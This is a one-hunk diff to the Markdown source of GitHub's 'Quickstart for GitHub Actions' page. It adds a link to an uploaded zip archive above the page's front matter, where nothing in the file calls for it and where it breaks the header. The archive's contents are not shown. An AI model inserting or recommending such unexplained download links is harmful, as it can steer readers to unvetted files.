@@ -1,3 +1,4 @@
+[community-standards (1).zip](https://github.com/github/docs/files/8149392/community-standards.1.zip)
 ---
 title: Quickstart for GitHub Actions
 intro: 'Try out the features of {% data variables.product.prodname_actions %} in 5 minutes or less.'
